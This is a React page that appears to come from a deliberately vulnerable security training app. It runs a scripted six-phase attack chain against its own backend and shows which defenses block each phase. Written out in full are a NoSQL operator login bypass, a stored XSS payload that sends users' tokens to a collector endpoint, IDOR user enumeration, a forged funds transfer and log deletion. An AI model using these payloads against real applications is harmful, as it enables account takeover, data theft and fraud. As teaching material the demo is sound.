// pages/AttackChainPage.jsx
// ============================================================
// INTERACTIVE FULL ATTACK CHAIN DEMO
// Walks through each phase of a real attack chain
// Shows which phases succeed in vulnerable mode and which
// are blocked in secure mode
// ============================================================

import { useState, useRef } from 'react';
import API from '../api/axiosConfig';
import useSecurityMode from '../hooks/useSecurityMode';

const PHASES = [
  {
    id:       'recon',
    name:     'Phase 1: Reconnaissance',
    icon:     '🔍',
    goal:     'Map the attack surface — find endpoints, framework, error verbosity',
    color:    '#3498db',
  },
  {
    id:       'injection',
    name:     'Phase 2: NoSQL Injection',
    icon:     '💉',
    goal:     'Bypass authentication without valid credentials',
    color:    '#e74c3c',
  },
  {
    id:       'xss',
    name:     'Phase 3: Stored XSS',
    icon:     '☠️',
    goal:     'Plant persistent payload to harvest tokens from future victims',
    color:    '#9b59b6',
  },
  {
    id:       'idor',
    name:     'Phase 4: IDOR Exfiltration',
    icon:     '📤',
    goal:     'Enumerate all users and exfiltrate their data',
    color:    '#e67e22',
  },
  {
    id:       'csrf',
    name:     'Phase 5: CSRF Exploitation',
    icon:     '🎭',
    goal:     'Perform unauthorized actions using victim\'s session',
    color:    '#f39c12',
  },
  {
    id:       'cover',
    name:     'Phase 6: Cover Tracks',
    icon:     '🧹',
    goal:     'Clear logs to hide evidence of the attack',
    color:    '#7f8c8d',
  },
];

export default function AttackChainPage() {
  const { mode, isVulnerable } = useSecurityMode();

  const [sessionId,    setSessionId]    = useState(null);
  const [phaseResults, setPhaseResults] = useState({});
  const [running,      setRunning]      = useState(false);
  const [currentPhase, setCurrentPhase] = useState(null);
  const [tokens,       setTokens]       = useState([]);
  const [attackerToken, setAttackerToken] = useState(null);
  const [allUsers,     setAllUsers]     = useState([]);
  const [log,          setLog]          = useState([]);
  const stopRef = useRef(false);

  const addLog = (msg, type = 'info') => {
    setLog(prev => [...prev, {
      msg,
      type,
      time: new Date().toLocaleTimeString(),
    }]);
  };

  const recordPhase = async (phase, success, details) => {
    if (!sessionId) return;
    try {
      await API.post('/redteam/phase', { sessionId, phase, success, details });
    } catch (e) {}
  };

  // ── Start full attack chain ───────────────────────────────
  const runChain = async () => {
    setRunning(true);
    setPhaseResults({});
    setLog([]);
    setAttackerToken(null);
    setAllUsers([]);
    stopRef.current = false;

    addLog('🚀 Attack chain initiated', 'attack');
    addLog(`📋 Target mode: ${mode}`, 'info');

    // Start session
    try {
      const res = await API.post('/redteam/start');
      setSessionId(res.data.sessionId);
      addLog(`📝 Session ID: ${res.data.sessionId}`, 'info');
    } catch (e) {
      addLog('Failed to start session', 'error');
    }

    await runPhase1Recon();
    if (stopRef.current) { setRunning(false); return; }
    await sleep(800);

    const token = await runPhase2Injection();
    if (stopRef.current) { setRunning(false); return; }
    await sleep(800);

    await runPhase3Xss(token);
    if (stopRef.current) { setRunning(false); return; }
    await sleep(800);

    await runPhase4Idor(token);
    if (stopRef.current) { setRunning(false); return; }
    await sleep(800);

    await runPhase5Csrf(token);
    if (stopRef.current) { setRunning(false); return; }
    await sleep(800);

    await runPhase6Cover();

    addLog('', 'spacer');
    addLog('═══ ATTACK CHAIN COMPLETE ═══', 'header');

    setRunning(false);
  };

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  // ── Phase 1: Reconnaissance ──────────────────────────────
  const runPhase1Recon = async () => {
    setCurrentPhase('recon');
    addLog('', 'spacer');
    addLog('── Phase 1: Reconnaissance ──', 'header');

    try {
      const res = await API.get('/mode');
      const configExposed = !!res.data.settings;  // only true if admin-authenticated

      if (configExposed) {
        addLog(`✅ Full config exposed: ${Object.keys(res.data.settings).length} control flags visible`, 'attack');
        setPhaseResults(p => ({ ...p, recon: { success: true, detail: 'Full config leaked to unauthenticated caller' } }));
        await recordPhase('Reconnaissance', true, 'Full config leaked to unauthenticated caller');
      } else {
        addLog(`🔒 Config hidden — mode is ${res.data.currentMode} but no settings exposed`, 'blocked');
        setPhaseResults(p => ({ ...p, recon: { success: false, detail: 'Config gated behind admin auth' } }));
        await recordPhase('Reconnaissance', false, 'Config gated behind admin auth');
      }
    } catch (e) {
      addLog('❌ Recon blocked', 'blocked');
      setPhaseResults(p => ({ ...p, recon: { success: false, detail: 'Endpoints not accessible' } }));
    }
  };

  // ── Phase 2: NoSQL Injection ─────────────────────────────
  const runPhase2Injection = async () => {
    setCurrentPhase('injection');
    addLog('', 'spacer');
    addLog('── Phase 2: NoSQL Injection ──', 'header');

    try {
      const res = await API.post('/auth/login', {
        email:    'any@email.com',
        password: { $gt: '' },
      });

      const token = res.data.token;
      setAttackerToken(token);
      addLog(`✅ Authentication bypassed — no password used`, 'attack');
      addLog(`✅ JWT obtained: ${token.substring(0, 40)}...`, 'attack');
      addLog(`✅ User role: ${res.data.user?.role}`, 'attack');
      setPhaseResults(p => ({ ...p, injection: { success: true, detail: 'Login bypassed via $gt operator' } }));
      await recordPhase('NoSQL Injection', true, 'Auth bypassed, token obtained');
      return token;

    } catch (e) {
      const status = e.response?.status;
      if (status === 401) {
        addLog('🔒 Injection blocked — operators sanitized', 'blocked');
        addLog('🔒 Attempting fallback: register with admin role...', 'info');

        try {
          const reg = await API.post('/auth/register', {
            username: `attacker${Date.now()}`,
            email:    `attacker${Date.now()}@evil.com`,
            password: { $gt: '' },
            role:     'admin',
          });
          addLog('🔒 Weak password rejected by validator', 'blocked');
        } catch (e2) {
          addLog('🔒 Registration also blocked — validation active', 'blocked');
        }
      }
      if (status === 429) addLog('🔒 Rate limited — too many attempts', 'blocked');

      setPhaseResults(p => ({ ...p, injection: { success: false, detail: `Blocked: ${e.response?.data?.error}` } }));
      await recordPhase('NoSQL Injection', false, 'Sanitization blocked injection');
      return null;
    }
  };

  // ── Phase 3: Stored XSS ──────────────────────────────────
  const runPhase3Xss = async (token) => {
    setCurrentPhase('xss');
    addLog('', 'spacer');
    addLog('── Phase 3: Stored XSS ──', 'header');

    const xssPayload = `<img src=x onerror="fetch('http://localhost:5000/api/redteam/collect?token='+localStorage.getItem('token'))">`;

    const headers = token ? { Authorization: `Bearer ${token}` } : {};

    try {
      await API.post('/comments', {
        content: xssPayload,
        author:  'innocent-user',
      }, { headers });

      addLog(`✅ XSS payload stored successfully`, 'attack');
      addLog(`✅ Payload: ${xssPayload.substring(0, 60)}...`, 'attack');
      addLog(`✅ Every user who loads /comments will fire this`, 'attack');
      addLog(`⏳ Checking if tokens were harvested...`, 'info');

      await sleep(1500);
      const collected = await API.get('/redteam/tokens');
      setTokens(collected.data.tokens || []);

      if (collected.data.count > 0) {
        addLog(`✅ ${collected.data.count} token(s) harvested from victims!`, 'attack');
      } else {
        addLog(`ℹ️  Payload stored — tokens collected when victims load page`, 'info');
      }

      setPhaseResults(p => ({ ...p, xss: { success: true, detail: 'Payload stored, fires for all visitors' } }));
      await recordPhase('Stored XSS', true, 'Payload persisted in database');

    } catch (e) {
      addLog('🔒 XSS payload sanitized by DOMPurify', 'blocked');
      addLog('🔒 CSP headers would block execution even if stored', 'blocked');
      setPhaseResults(p => ({ ...p, xss: { success: false, detail: 'DOMPurify + CSP blocked payload' } }));
      await recordPhase('Stored XSS', false, 'Sanitization removed payload');
    }
  };

  // ── Phase 4: IDOR Exfiltration ───────────────────────────
  const runPhase4Idor = async (token) => {
    setCurrentPhase('idor');
    addLog('', 'spacer');
    addLog('── Phase 4: IDOR Exfiltration ──', 'header');

    const headers = token ? { Authorization: `Bearer ${token}` } : {};

    try {
      const res = await API.get('/users', { headers });
      const users = res.data.users || [];
      setAllUsers(users);

      addLog(`✅ All ${users.length} users enumerated`, 'attack');
      users.forEach(u => {
        addLog(`   → ${u.username} | ${u.email} | ${u.role} | ID: ${u._id.substring(0,12)}...`, 'data');
      });

      // Try to access each user individually
      let exfiltrated = 0;
      for (const user of users.slice(0, 3)) {
        try {
          await API.get(`/users/${user._id}`, { headers });
          exfiltrated++;
        } catch (e) {}
      }

      addLog(`✅ ${exfiltrated} user profiles accessed via IDOR`, 'attack');
      setPhaseResults(p => ({ ...p, idor: { success: true, detail: `${users.length} users enumerated` } }));
      await recordPhase('IDOR Exfiltration', true, `${users.length} users exposed`);

    } catch (e) {
      const status = e.response?.status;
      if (status === 403) {
        addLog('🔒 User list blocked — admin only in secure mode', 'blocked');
        addLog('🔒 IDOR blocked — ownership check active', 'blocked');
      }
      setPhaseResults(p => ({ ...p, idor: { success: false, detail: 'Access denied — ownership enforced' } }));
      await recordPhase('IDOR Exfiltration', false, 'Ownership checks blocked access');
    }
  };

  // ── Phase 5: CSRF ────────────────────────────────────────
  const runPhase5Csrf = async (token) => {
    setCurrentPhase('csrf');
    addLog('', 'spacer');
    addLog('── Phase 5: CSRF Exploitation ──', 'header');

    const headers = token ? { Authorization: `Bearer ${token}` } : {};

    try {
      const res = await API.post('/user/transfer',
        { amount: 9999, toAccount: 'ATTACKER_BANK' },
        { headers }
      );

      addLog(`✅ Forged transfer executed: $9999 → ATTACKER_BANK`, 'attack');
      addLog(`✅ No CSRF token required in vulnerable mode`, 'attack');
      setPhaseResults(p => ({ ...p, csrf: { success: true, detail: 'Transfer executed without CSRF token' } }));
      await recordPhase('CSRF Exploitation', true, 'Transfer executed without token');

    } catch (e) {
      const status = e.response?.status;
      if (status === 403) {
        addLog('🔒 CSRF token required — forged request blocked', 'blocked');
        addLog('🔒 Origin header validation active', 'blocked');
      }
      setPhaseResults(p => ({ ...p, csrf: { success: false, detail: 'CSRF token validation blocked request' } }));
      await recordPhase('CSRF Exploitation', false, 'CSRF validation blocked transfer');
    }
  };

  // ── Phase 6: Cover Tracks ────────────────────────────────
  const runPhase6Cover = async () => {
    setCurrentPhase('cover');
    addLog('', 'spacer');
    addLog('── Phase 6: Cover Tracks ──', 'header');

    try {
      await API.delete('/logs');
      addLog(`✅ Security logs cleared — attack hidden`, 'attack');
      addLog(`⚠️  In production: logs would be in external SIEM`, 'info');
      addLog(`⚠️  External logs cannot be deleted by attacker`, 'info');
      setPhaseResults(p => ({ ...p, cover: { success: true, detail: 'Local logs cleared' } }));
    } catch (e) {
      addLog('🔒 Log deletion blocked', 'blocked');
      setPhaseResults(p => ({ ...p, cover: { success: false } }));
    }
  };

  const successCount = Object.values(phaseResults).filter(p => p?.success).length;
  const totalPhases  = Object.keys(phaseResults).length;

  return (
    <div style={styles.page}>
      <div style={styles.container}>
        <h1 style={styles.title}>☠️ Full Attack Chain — Red Team Demo</h1>

        <div style={isVulnerable ? styles.vulnBanner : styles.secureBanner}>
          {isVulnerable
            ? '⚠️ VULNERABLE MODE — all attack phases will succeed'
            : '🔒 SECURE MODE — defenses will block each phase'}
        </div>

        {/* Kill chain diagram */}
        <div style={styles.chainDiagram}>
          {PHASES.map((phase, i) => {
            const result  = phaseResults[phase.id];
            const active  = currentPhase === phase.id && running;
            return (
              <div key={phase.id} style={styles.chainStep}>
                <div style={{
                  ...styles.phaseNode,
                  background:  active       ? phase.color :
                               result?.success === true  ? '#1a4a1a' :
                               result?.success === false ? '#4a1a1a' :
                               '#1a1a2e',
                  border:      `2px solid ${
                               active       ? phase.color :
                               result?.success === true  ? '#27ae60' :
                               result?.success === false ? '#e74c3c' :
                               '#0f3460'}`,
                  animation:   active ? 'pulse 1s infinite' : 'none',
                }}>
                  <div style={styles.phaseIcon}>{phase.icon}</div>
                  <div style={styles.phaseName}>{phase.name}</div>
                  {result && (
                    <div style={{
                      fontSize: '11px',
                      color: result.success ? '#2ecc71' : '#e74c3c',
                      marginTop: '4px',
                    }}>
                      {result.success ? '✅ SUCCESS' : '🔒 BLOCKED'}
                    </div>
                  )}
                </div>
                {i < PHASES.length - 1 && (
                  <div style={styles.arrow}>→</div>
                )}
              </div>
            );
          })}
        </div>

        {/* Score */}
        {totalPhases > 0 && (
          <div style={{
            ...styles.scoreBox,
            background: successCount === 0 ? '#0a2a0a' :
                        successCount === totalPhases ? '#2a0a0a' : '#2a1a00',
          }}>
            <span style={{ fontSize: '24px', fontWeight: 'bold',
              color: successCount === 0 ? '#2ecc71' :
                     successCount === totalPhases ? '#e74c3c' : '#f39c12'
            }}>
              {successCount}/{totalPhases} attack phases succeeded
            </span>
            <span style={{ color: '#888', fontSize: '13px', marginLeft: '16px' }}>
              {successCount === 0 ? '🔒 All attacks blocked — secure mode working'
               : successCount === totalPhases ? '💀 Full compromise — switch to secure mode'
               : '⚠️ Partial compromise'}
            </span>
          </div>
        )}

        {/* Controls */}
        <div style={styles.controls}>
          <button
            onClick={runChain}
            disabled={running}
            style={styles.runBtn}
          >
            {running ? '⚔️ Attack in progress...' : '🚀 Run Full Attack Chain'}
          </button>
          {running && (
            <button onClick={() => { stopRef.current = true; }} style={styles.stopBtn}>
              ⏹ Abort
            </button>
          )}
          <button
            onClick={async () => {
              await API.delete('/redteam/reset');
              setPhaseResults({});
              setLog([]);
              setAttackerToken(null);
              setAllUsers([]);
              setTokens([]);
              setSessionId(null);
            }}
            style={styles.resetBtn}
          >
            🔄 Reset
          </button>
        </div>

        {/* Attack log */}
        {log.length > 0 && (
          <div style={styles.logBox}>
            <h3 style={{ color: '#e0e0e0', marginTop: 0 }}>Attack Log</h3>
            <div style={styles.logScroll}>
              {log.map((entry, i) => (
                <div key={i} style={{
                  ...styles.logLine,
                  color: entry.type === 'attack'  ? '#e74c3c' :
                         entry.type === 'blocked' ? '#2ecc71' :
                         entry.type === 'data'    ? '#f39c12' :
                         entry.type === 'header'  ? '#3498db' :
                         entry.type === 'spacer'  ? 'transparent' :
                         '#888',
                  fontWeight: entry.type === 'header' ? 'bold' : 'normal',
                  borderBottom: entry.type === 'spacer' ? 'none' : '1px solid #0a0a1a',
                }}>
                  {entry.type !== 'spacer' && (
                    <span style={{ color: '#555', marginRight: '8px', fontSize: '11px' }}>
                      {entry.time}
                    </span>
                  )}
                  {entry.msg}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Harvested tokens */}
        {tokens.length > 0 && (
          <div style={styles.tokensBox}>
            <h3 style={{ color: '#e74c3c', marginTop: 0 }}>
              💀 Harvested Tokens ({tokens.length})
            </h3>
            {tokens.map((t, i) => (
              <div key={i} style={styles.tokenRow}>
                <span style={{ color: '#888', fontSize: '11px' }}>{t.timestamp}</span>
                <code style={styles.tokenCode}>{t.token}</code>
              </div>
            ))}
          </div>
        )}

        {/* Red Team vs Blue Team */}
        <div style={styles.comparisonBox}>
          <h2 style={{ color: '#e0e0e0', textAlign: 'center', marginTop: 0 }}>
            ⚔️ Red Team vs Blue Team
          </h2>
          <div style={styles.comparisonGrid}>
            <div style={styles.redTeamCol}>
              <h3 style={{ color: '#e74c3c', marginTop: 0 }}>🔴 Red Team (Attacker)</h3>
              {[
                { phase: 'Recon', action: 'Probe endpoints for info leakage' },
                { phase: 'Initial Access', action: 'NoSQL injection bypasses login' },
                { phase: 'Persistence', action: 'XSS payload stored for all visitors' },
                { phase: 'Exfiltration', action: 'IDOR dumps entire user database' },
                { phase: 'Impact', action: 'CSRF transfers funds without consent' },
                { phase: 'Evasion', action: 'Delete local logs to hide activity' },
              ].map(item => (
                <div key={item.phase} style={styles.comparisonRow}>
                  <span style={styles.compPhase}>{item.phase}</span>
                  <span style={styles.compAction}>{item.action}</span>
                </div>
              ))}
            </div>

            <div style={styles.blueTeamCol}>
              <h3 style={{ color: '#2ecc71', marginTop: 0 }}>🔵 Blue Team (Defender)</h3>
              {[
                { phase: 'Recon', action: 'Generic errors, no mode exposure in prod' },
                { phase: 'Initial Access', action: 'express-mongo-sanitize strips operators' },
                { phase: 'Persistence', action: 'DOMPurify + CSP headers prevent XSS' },
                { phase: 'Exfiltration', action: 'Ownership checks enforce IDOR protection' },
                { phase: 'Impact', action: 'CSRF token + origin validation blocks forged requests' },
                { phase: 'Evasion', action: 'External SIEM — logs cannot be deleted locally' },
              ].map(item => (
                <div key={item.phase} style={styles.comparisonRow}>
                  <span style={styles.compPhase}>{item.phase}</span>
                  <span style={{ ...styles.compAction, color: '#2ecc71' }}>{item.action}</span>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* OWASP mapping */}
        <div style={styles.owaspBox}>
          <h3 style={{ color: '#f39c12', marginTop: 0 }}>
            📋 OWASP Top 10 Mapping
          </h3>
          <div style={styles.owaspGrid}>
            {[
              { code: 'A03:2021', name: 'Injection', phase: 'Phase 2', color: '#e74c3c' },
              { code: 'A03:2021', name: 'XSS', phase: 'Phase 3', color: '#9b59b6' },
              { code: 'A01:2021', name: 'Broken Access Control', phase: 'Phase 4', color: '#e67e22' },
              { code: 'A01:2021', name: 'CSRF', phase: 'Phase 5', color: '#f39c12' },
              { code: 'A05:2021', name: 'Security Misconfiguration', phase: 'Phase 1', color: '#3498db' },
              { code: 'A09:2021', name: 'Security Logging Failures', phase: 'Phase 6', color: '#7f8c8d' },
            ].map(item => (
              <div key={item.name} style={{ ...styles.owaspCard, borderTop: `3px solid ${item.color}` }}>
                <div style={{ color: item.color, fontSize: '11px', fontWeight: 'bold' }}>{item.code}</div>
                <div style={{ color: '#e0e0e0', fontWeight: 'bold' }}>{item.name}</div>
                <div style={{ color: '#888', fontSize: '12px' }}>{item.phase}</div>
              </div>
            ))}
          </div>
        </div>

      </div>
    </div>
  );
}

const styles = {
  page:           { minHeight: '100vh', background: '#0a0a1a', padding: '20px' },
  container:      { maxWidth: '1100px', margin: '0 auto' },
  title:          { color: '#e0e0e0', borderBottom: '2px solid #c0392b', paddingBottom: '10px' },
  vulnBanner:     { background: '#c0392b', color: 'white', padding: '12px 16px', borderRadius: '6px', marginBottom: '20px', fontWeight: 'bold' },
  secureBanner:   { background: '#27ae60', color: 'white', padding: '12px 16px', borderRadius: '6px', marginBottom: '20px', fontWeight: 'bold' },
  chainDiagram:   { display: 'flex', alignItems: 'center', overflowX: 'auto', padding: '20px 0', marginBottom: '20px', gap: '4px' },
  chainStep:      { display: 'flex', alignItems: 'center', gap: '4px', flexShrink: 0 },
  phaseNode:      { padding: '12px', borderRadius: '8px', textAlign: 'center', minWidth: '130px', transition: 'all 0.3s' },
  phaseIcon:      { fontSize: '24px', marginBottom: '4px' },
  phaseName:      { color: '#e0e0e0', fontSize: '11px', fontWeight: 'bold' },
  arrow:          { color: '#444', fontSize: '20px', padding: '0 4px' },
  scoreBox:       { padding: '16px', borderRadius: '8px', marginBottom: '20px', display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: '8px' },
  controls:       { display: 'flex', gap: '10px', marginBottom: '20px', flexWrap: 'wrap' },
  runBtn:         { padding: '12px 28px', background: '#c0392b', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 'bold', fontSize: '15px' },
  stopBtn:        { padding: '12px 20px', background: '#7f8c8d', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer' },
  resetBtn:       { padding: '12px 20px', background: '#2c3e50', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer' },
  logBox:         { background: '#0a0a0a', border: '1px solid #1a1a2e', borderRadius: '8px', padding: '16px', marginBottom: '20px' },
  logScroll:      { maxHeight: '350px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '13px' },
  logLine:        { padding: '3px 0' },
  tokensBox:      { background: '#1a0a0a', border: '1px solid #c0392b', borderRadius: '8px', padding: '16px', marginBottom: '20px' },
  tokenRow:       { display: 'flex', flexDirection: 'column', gap: '2px', marginBottom: '8px', padding: '8px', background: '#0a0000', borderRadius: '4px' },
  tokenCode:      { color: '#e74c3c', fontSize: '11px', wordBreak: 'break-all' },
  comparisonBox:  { background: '#0d0d1a', border: '1px solid #0f3460', borderRadius: '8px', padding: '20px', marginBottom: '20px' },
  comparisonGrid: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' },
  redTeamCol:     { background: '#1a0a0a', padding: '16px', borderRadius: '6px' },
  blueTeamCol:    { background: '#0a1a0a', padding: '16px', borderRadius: '6px' },
  comparisonRow:  { display: 'flex', flexDirection: 'column', marginBottom: '12px', paddingBottom: '12px', borderBottom: '1px solid #1a1a1a' },
  compPhase:      { color: '#888', fontSize: '11px', textTransform: 'uppercase', marginBottom: '2px' },
  compAction:     { color: '#ccc', fontSize: '13px' },
  owaspBox:       { background: '#16213e', border: '1px solid #0f3460', borderRadius: '8px', padding: '16px' },
  owaspGrid:      { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '10px' },
  owaspCard:      { background: '#0a0a1a', padding: '12px', borderRadius: '6px', textAlign: 'center' },
};